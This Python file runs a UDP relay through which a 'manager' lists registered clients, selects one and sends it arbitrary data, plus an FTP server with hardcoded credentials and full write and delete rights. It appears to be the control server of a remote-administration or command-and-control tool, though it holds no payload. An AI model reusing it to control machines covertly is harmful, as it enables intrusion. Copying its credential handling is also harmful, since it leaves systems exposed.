import socket
import threading
from pyftpdlib.authorizers import DummyAuthorizer
from pyftpdlib.handlers import FTPHandler
from pyftpdlib.servers import FTPServer

######################################
######### GLOBAL VARIABLES ###########
######################################

PORT = 8000
#server_address = '10.1.18.200'
#server_address = '157.245.7.127'
server_address = 'localhost'

manager_address = ''
client_list = []
selected_client = ()

FTP_PORT = 8001
FTP_USER = "Y7V"
FTP_PASSWORD = "PSWD"
#FTP_DIRECTORY = "/FTP"
FTP_DIRECTORY = "D:\\FTP"
ftp_address = server_address, FTP_PORT





######################################
############# FUNCTIONS ##############
######################################

def ftp():
  authorizer = DummyAuthorizer()
  authorizer.add_user(FTP_USER, FTP_PASSWORD, FTP_DIRECTORY, perm='elradfmw')

  handler = FTPHandler
  handler.authorizer = authorizer
  handler.banner = "pyftpdlib based ftpd ready."

  # USELESS OPTIONS
  handler.masquerade_address = server_address
  handler.passive_ports = range(60000, 65535)

  ftp_server = FTPServer(ftp_address, handler)

  ftp_server.max_cons = 256
  ftp_server.max_cons_per_ip = 5

  ftp_server.serve_forever()
  pass

######################################
########## SERVER CREATING ###########
######################################


thread = threading.Thread(target=ftp)
thread.start()

server_socket = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
server_socket.bind((server_address, PORT))
#server_socket.bind(('157.245.7.127', PORT))

print(f'Server started at port {PORT}')

while True:
  data, address = server_socket.recvfrom(1024)
  message = data.decode()

  ########### NEW CONNECTION ###########
  if address not in client_list and 'Alias' in message:
    print(f' {message[6:]}, {address[0]}, {address[1]} connected')
    client_list.append(f'{message[6:]} : {address}')
  ####### MANAGER IDENTIFICATION #######
  if 'Manager' in message:
    manager_address = address
  ########## SHOW CLIENT LIST ##########
  if 'show' in message:
    #print(f'CLIENTS: {client_list}')
    #server_socket.sendto(f'CLIENTS: {client_list}'.encode(), manager_address)
    server_socket.sendto(b'CLIENTS:', manager_address)
    for c in client_list:
      server_socket.sendto(f'{c}'.encode(), manager_address)
  ######### SELECT A CLIENT ############
  if 'select' in message:
    text = message.split(' ')
    selected_client = text[3], int(text[4])
    server_socket.sendto(f'SELECTED: {selected_client}'.encode(), manager_address)
  ########## SEND TO CLIENT ############
  if 'send' in message:
    text = message.split(' ')
    data = text[1].encode()
    #print(data)
    server_socket.sendto(data, selected_client)
  if '[*]' in message:
    server_socket.sendto(data, manager_address)
  ######################################














